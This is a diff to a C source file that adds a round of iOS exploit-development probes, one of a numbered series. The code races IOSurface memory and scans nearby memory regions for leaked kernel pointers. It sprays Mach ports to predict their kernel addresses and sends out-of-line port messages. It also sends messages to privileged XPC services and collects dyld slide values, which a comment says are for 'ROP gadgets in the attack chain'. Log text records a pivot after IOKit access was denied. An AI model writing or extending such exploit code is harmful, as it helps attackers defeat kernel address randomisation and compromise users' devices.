@@ -4538,6 +4538,425 @@ static void r311_probe(void) {
     fflush(stdout);
 }
 
+static void r313_probe(void) {
+    rlog("\n=== r313: XPC Service Probes + IOSurface Race + Mach OOL ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: IOSurface shared memory race ---- */
+    /* Create and destroy surfaces rapidly while scanning mapped memory
+     * for transient kernel pointers that might appear before zeroing */
+    rlog("--- Part 1: IOSurface shared memory race (100 iterations) ---\n");
+    fflush(stdout);
+
+    int kptr_found_total = 0;
+    for (int iter = 0; iter < 100; iter++) {
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 64, h = 64, bpr = 256, alloc = 256*64, pf = 0x42475241;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        if (surf) {
+            void *base = IOSurfaceGetBaseAddress(surf);
+            size_t total = IOSurfaceGetAllocSize(surf);
+
+            /* Immediately scan before kernel zeroing completes */
+            if (base && total > 0) {
+                uint64_t *p = (uint64_t *)base;
+                for (size_t i = 0; i < total/8; i++) {
+                    uint64_t val = p[i];
+                    if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("  RACE iter=%d +%zu: 0x%016llx *** KPTR ***\n",
+                             iter, i*8, val);
+                        kptr_found_total++;
+                    }
+                }
+            }
+
+            /* Also check IOSurface properties for any kernel data */
+            uint32_t sid = IOSurfaceGetID(surf);
+            mach_port_t mp = IOSurfaceCreateMachPort(surf);
+
+            if (iter == 0) {
+                rlog("  First surface: ID=%u machport=0x%x base=%p size=%zu\n",
+                     sid, mp, base, total);
+
+                /* Use IOSurfaceCopyValue to look for interesting properties */
+                CFTypeRef val = IOSurfaceCopyValue(surf, CFSTR("IOSurfaceAllocSize"));
+                if (val) {
+                    if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                        long long v = 0;
+                        CFNumberGetValue(val, kCFNumberLongLongType, &v);
+                        rlog("  IOSurfaceAllocSize via CopyValue: %lld\n", v);
+                    }
+                    CFRelease(val);
+                }
+
+                /* Try to get all values */
+                CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
+                if (allVals) {
+                    CFIndex cnt = CFDictionaryGetCount(allVals);
+                    rlog("  IOSurfaceCopyAllValues: %ld keys\n", (long)cnt);
+
+                    /* Enumerate all keys looking for pointers in numeric values */
+                    const void **keys = malloc(sizeof(void*) * cnt);
+                    const void **vals = malloc(sizeof(void*) * cnt);
+                    if (keys && vals) {
+                        CFDictionaryGetKeysAndValues(allVals, keys, vals);
+                        for (CFIndex k = 0; k < cnt; k++) {
+                            if (CFGetTypeID(vals[k]) == CFNumberGetTypeID()) {
+                                long long nv = 0;
+                                CFNumberGetValue(vals[k], kCFNumberLongLongType, &nv);
+                                if ((nv & 0xFFFFFF0000000000LL) == 0xFFFFFFF000000000LL) {
+                                    char kbuf[128] = {0};
+                                    CFStringGetCString(keys[k], kbuf, sizeof(kbuf),
+                                        kCFStringEncodingUTF8);
+                                    rlog("  *** KPTR in property '%s': 0x%016llx ***\n",
+                                         kbuf, nv);
+                                    kptr_found_total++;
+                                }
+                            }
+                        }
+                        free(keys); free(vals);
+                    }
+                    CFRelease(allVals);
+                }
+            }
+
+            if (mp) mach_port_deallocate(mach_task_self(), mp);
+            CFRelease(surf);
+        }
+        CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(an); CFRelease(pfn);
+        CFRelease(props);
+    }
+    rlog("  Race scan complete: %d KPTR found\n", kptr_found_total);
+    fflush(stdout);
+
+    /* ---- Part 2: vm_remap of IOSurface backing store ---- */
+    rlog("\n--- Part 2: vm_remap IOSurface backing + region analysis ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef props2 = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w2 = 128, h2 = 128, bpr2 = 512, alloc2 = 512*128, pf2 = 0x42475241;
+    CFNumberRef wn2 = CFNumberCreate(NULL, kCFNumberIntType, &w2);
+    CFNumberRef hn2 = CFNumberCreate(NULL, kCFNumberIntType, &h2);
+    CFNumberRef bn2 = CFNumberCreate(NULL, kCFNumberIntType, &bpr2);
+    CFNumberRef an2 = CFNumberCreate(NULL, kCFNumberIntType, &alloc2);
+    CFNumberRef pfn2 = CFNumberCreate(NULL, kCFNumberIntType, &pf2);
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceWidth"), wn2);
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceHeight"), hn2);
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceBytesPerRow"), bn2);
+    CFDictionarySetValue(props2, CFSTR("IOSurfaceAllocSize"), an2);
+    CFDictionarySetValue(props2, CFSTR("IOSurfacePixelFormat"), pfn2);
+
+    IOSurfaceRef s2 = IOSurfaceCreate(props2);
+    if (s2) {
+        void *base2 = IOSurfaceGetBaseAddress(s2);
+        size_t total2 = IOSurfaceGetAllocSize(s2);
+        uint32_t sid2 = IOSurfaceGetID(s2);
+        rlog("  Surface: ID=%u base=%p size=%zu\n", sid2, base2, total2);
+
+        /* Scan VM regions around the surface to find kernel-mapped metadata */
+        mach_vm_address_t scan_addr = (mach_vm_address_t)base2 - 0x100000;
+        rlog("  VM regions around surface base:\n");
+        for (int r = 0; r < 40; r++) {
+            mach_vm_size_t rsize = 0;
+            natural_t depth = 1;
+            struct vm_region_submap_info_64 rinfo;
+            mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(), &scan_addr, &rsize, &depth,
+                (vm_region_recurse_info_t)&rinfo, &rcnt);
+            if (kr != 0) break;
+
+            int is_surface = (scan_addr <= (mach_vm_address_t)base2 &&
+                scan_addr + rsize > (mach_vm_address_t)base2);
+
+            rlog("    0x%llx-0x%llx sz=0x%llx prot=%d/%d tag=%d%s\n",
+                 (unsigned long long)scan_addr,
+                 (unsigned long long)(scan_addr + rsize),
+                 (unsigned long long)rsize,
+                 rinfo.protection, rinfo.max_protection,
+                 rinfo.user_tag,
+                 is_surface ? " <-- SURFACE" : "");
+
+            /* For non-surface regions near the surface, try to read and scan for KPTR */
+            if (!is_surface && rinfo.protection & VM_PROT_READ && rsize <= 0x100000) {
+                vm_offset_t data = 0;
+                mach_msg_type_number_t dataCnt = 0;
+                kr = mach_vm_read(mach_task_self(), scan_addr,
+                    rsize < 0x10000 ? (mach_vm_size_t)rsize : 0x10000, &data, &dataCnt);
+                if (kr == 0 && dataCnt > 0) {
+                    uint64_t *dp = (uint64_t *)data;
+                    for (size_t i = 0; i < dataCnt/8; i++) {
+                        if ((dp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      +%zu: 0x%016llx *** KPTR ***\n", i*8, dp[i]);
+                            kptr_found_total++;
+                        }
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                }
+            }
+
+            scan_addr += rsize;
+            if (scan_addr > (mach_vm_address_t)base2 + 0x200000) break;
+        }
+
+        /* Try vm_remap to create a second mapping of the surface memory */
+        mach_vm_address_t remap_addr = 0;
+        vm_prot_t cur_prot, max_prot;
+        kr = mach_vm_remap(mach_task_self(), &remap_addr, total2, 0,
+            VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)base2,
+            FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
+        rlog("\n  vm_remap of surface: kr=0x%x addr=0x%llx prot=%d/%d\n",
+             kr, (unsigned long long)remap_addr, cur_prot, max_prot);
+        if (kr == 0) {
+            /* Write to original, read from remap to confirm shared mapping */
+            ((volatile uint64_t *)base2)[0] = 0xDEADBEEF12345678ULL;
+            uint64_t readback = ((volatile uint64_t *)remap_addr)[0];
+            rlog("  Shared mapping check: wrote 0xDEADBEEF12345678, read 0x%016llx %s\n",
+                 readback, readback == 0xDEADBEEF12345678ULL ? "SHARED!" : "NOT SHARED");
+            mach_vm_deallocate(mach_task_self(), remap_addr, total2);
+        }
+
+        CFRelease(s2);
+    }
+    CFRelease(wn2); CFRelease(hn2); CFRelease(bn2); CFRelease(an2); CFRelease(pfn2);
+    CFRelease(props2);
+    fflush(stdout);
+
+    /* ---- Part 3: Mach OOL descriptor to kernel ports ---- */
+    rlog("\n--- Part 3: Mach OOL port descriptors + port spray ---\n");
+    fflush(stdout);
+
+    /* Create many ports, then try to get info about them.
+     * The idea: spray enough ports that we can predict their kernel address. */
+
+    #define SPRAY_COUNT 1024
+    mach_port_t sprayed[SPRAY_COUNT];
+    int spray_ok = 0;
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayed[i]);
+        if (kr == 0) {
+            /* Insert a send right */
+            mach_port_insert_right(mach_task_self(), sprayed[i], sprayed[i],
+                MACH_MSG_TYPE_MAKE_SEND);
+            spray_ok++;
+        }
+    }
+    rlog("  Sprayed %d ports\n", spray_ok);
+
+    /* Check kobject on first/last sprayed ports */
+    for (int idx = 0; idx < SPRAY_COUNT; idx += 255) {
+        natural_t kotype = 0;
+        mach_vm_address_t kaddr = 0;
+        kr = mach_port_kobject(mach_task_self(), sprayed[idx], &kotype, &kaddr);
+        rlog("  port[%d]=0x%x: kobject kr=0x%x type=%u addr=0x%llx\n",
+             idx, sprayed[idx], kr, kotype, (unsigned long long)kaddr);
+    }
+
+    /* Try sending OOL ports in a message to ourselves and examine reply */
+    {
+        mach_port_t recv = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv);
+        mach_port_insert_right(mach_task_self(), recv, recv, MACH_MSG_TYPE_MAKE_SEND);
+
+        /* Send a message with OOL ports */
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_ports_descriptor_t ool_ports;
+        } send_msg = {0};
+
+        mach_port_t ool_port_list[16];
+        for (int i = 0; i < 16; i++) ool_port_list[i] = sprayed[i];
+
+        send_msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+        send_msg.hdr.msgh_size = sizeof(send_msg);
+        send_msg.hdr.msgh_remote_port = recv;
+        send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+        send_msg.hdr.msgh_id = 0x1337;
+        send_msg.body.msgh_descriptor_count = 1;
+        send_msg.ool_ports.address = ool_port_list;
+        send_msg.ool_ports.count = 16;
+        send_msg.ool_ports.deallocate = FALSE;
+        send_msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
+        send_msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+
+        kr = mach_msg(&send_msg.hdr, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+            sizeof(send_msg), 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+        rlog("  OOL send: kr=0x%x\n", kr);
+
+        /* Receive the message */
+        struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_ports_descriptor_t ool_ports;
+            mach_msg_trailer_t trailer;
+        } recv_msg = {0};
+
+        kr = mach_msg(&recv_msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(recv_msg), recv, 100, MACH_PORT_NULL);
+        rlog("  OOL recv: kr=0x%x id=0x%x desc_count=%u\n",
+             kr, recv_msg.hdr.msgh_id, recv_msg.body.msgh_descriptor_count);
+
+        if (kr == 0 && recv_msg.body.msgh_descriptor_count > 0) {
+            rlog("  OOL ports addr=%p count=%u\n",
+                 recv_msg.ool_ports.address, recv_msg.ool_ports.count);
+            mach_port_t *rcv_ports = (mach_port_t *)recv_msg.ool_ports.address;
+            if (rcv_ports) {
+                for (int i = 0; i < 16 && i < (int)recv_msg.ool_ports.count; i++) {
+                    rlog("    port[%d]=0x%x\n", i, rcv_ports[i]);
+                }
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), recv);
+    }
+
+    /* Cleanup sprayed ports */
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        mach_port_destroy(mach_task_self(), sprayed[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: XPC to privileged services ---- */
+    rlog("\n--- Part 4: XPC messages to privileged services ---\n");
+    fflush(stdout);
+
+    /* Try XPC connections to services we found in r311 */
+    const char *xpc_services[] = {
+        "com.apple.gpumemd.source",
+        "com.apple.iohideventsystem",
+        "com.apple.backboard.TouchDeliveryPolicyServer",
+        "com.apple.mobileassetd",
+        "com.apple.runningboard",
+        "com.apple.fairplayd",
+        "com.apple.cfprefsd.daemon",
+        "com.apple.mediaserverd",
+        "com.apple.coreservices.launchservicesd",
+        "com.apple.SpringBoard",
+    };
+
+    for (int i = 0; i < 10; i++) {
+        xpc_connection_t conn = xpc_connection_create_mach_service(
+            xpc_services[i], NULL, 0);
+        if (!conn) {
+            rlog("  %s: create failed\n", xpc_services[i]);
+            continue;
+        }
+
+        xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
+            /* Handler required but we process synchronously */
+        });
+        xpc_connection_resume(conn);
+
+        /* Send a simple ping/introspection message */
+        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_uint64(msg, "type", 1);
+        xpc_dictionary_set_string(msg, "action", "ping");
+
+        xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
+        if (reply) {
+            xpc_type_t rtype = xpc_get_type(reply);
+            if (rtype == XPC_TYPE_DICTIONARY) {
+                char *desc = xpc_copy_description(reply);
+                rlog("  %s: REPLY dict (%zu chars)\n", xpc_services[i],
+                     desc ? strlen(desc) : 0);
+                if (desc) {
+                    /* Print first 200 chars looking for addresses */
+                    size_t len = strlen(desc);
+                    if (len > 200) len = 200;
+                    rlog("    %.200s\n", desc);
+                    free(desc);
+                }
+            } else if (rtype == XPC_TYPE_ERROR) {
+                if (reply == XPC_ERROR_CONNECTION_INVALID) {
+                    rlog("  %s: CONNECTION_INVALID\n", xpc_services[i]);
+                } else if (reply == XPC_ERROR_CONNECTION_INTERRUPTED) {
+                    rlog("  %s: CONNECTION_INTERRUPTED\n", xpc_services[i]);
+                } else {
+                    rlog("  %s: error\n", xpc_services[i]);
+                }
+            } else {
+                rlog("  %s: reply type=%s\n", xpc_services[i],
+                     xpc_type_get_name(rtype));
+            }
+        }
+
+        xpc_connection_cancel(conn);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: dyld shared cache slide detection ---- */
+    rlog("\n--- Part 5: dyld shared cache slide analysis ---\n");
+    fflush(stdout);
+
+    /* The dyld shared cache is mapped at a slid address. If we can determine
+     * the slide, we know ASLR for all system libraries. While this isn't
+     * kernel ASLR, it's useful for ROP gadgets in the attack chain. */
+
+    /* Get a known function pointer from a framework */
+    void *iokit_sym = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+    void *cf_sym = dlsym(RTLD_DEFAULT, "CFRelease");
+    void *mach_sym = dlsym(RTLD_DEFAULT, "mach_msg");
+    void *objc_sym = dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+    rlog("  IOServiceGetMatchingService: %p\n", iokit_sym);
+    rlog("  CFRelease: %p\n", cf_sym);
+    rlog("  mach_msg: %p\n", mach_sym);
+    rlog("  objc_msgSend: %p\n", objc_sym);
+
+    /* Check _dyld_get_image_slide for the main executable */
+    extern uint32_t _dyld_image_count(void);
+    extern const char * _dyld_get_image_name(uint32_t image_index);
+    extern intptr_t _dyld_get_image_vmaddr_slide(uint32_t image_index);
+    extern const struct mach_header * _dyld_get_image_header(uint32_t image_index);
+
+    uint32_t img_count = _dyld_image_count();
+    rlog("  dyld image count: %u\n", img_count);
+    for (uint32_t i = 0; i < img_count && i < 10; i++) {
+        const char *name = _dyld_get_image_name(i);
+        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
+        const struct mach_header *hdr = _dyld_get_image_header(i);
+
+        const char *short_name = name;
+        const char *slash = strrchr(name, '/');
+        if (slash) short_name = slash + 1;
+
+        rlog("  [%u] %s slide=0x%lx header=%p\n", i, short_name, (long)slide, hdr);
+    }
+
+    /* Specifically look at shared cache base */
+    /* On modern iOS, all system frameworks are in one shared cache */
+    /* The slide is the same for all shared cache images */
+    for (uint32_t i = 1; i < img_count; i++) {
+        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
+        if (slide != 0) {
+            const char *name = _dyld_get_image_name(i);
+            const char *slash = strrchr(name, '/');
+            rlog("  Shared cache slide: 0x%lx (from %s)\n",
+                 (long)slide, slash ? slash+1 : name);
+            break;
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n  Total KPTR found across all probes: %d\n", kptr_found_total);
+    rlog("\n=== r313 complete ===\n");
+    fflush(stdout);
+}
+
 static void r312_probe(void) {
     rlog("\n=== r312: IOMobileFramebuffer Deep + IOHID + IOSurface XML ===\n\n");
     fflush(stdout);
@@ -33838,6 +34257,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 313) {
+            rlog("*** rounds=313: XPC Services + IOSurface Race + Mach OOL ***\n");
+            rlog("  r312: ALL IOKit selectors NoPermission. Pivoting to XPC/race.\n");
+            rlog("  Probe: Surface mem race, vm_remap, Mach OOL, XPC services, dyld.\n\n");
+            r313_probe();
             goto done;
         }
         if (rounds == 312) {
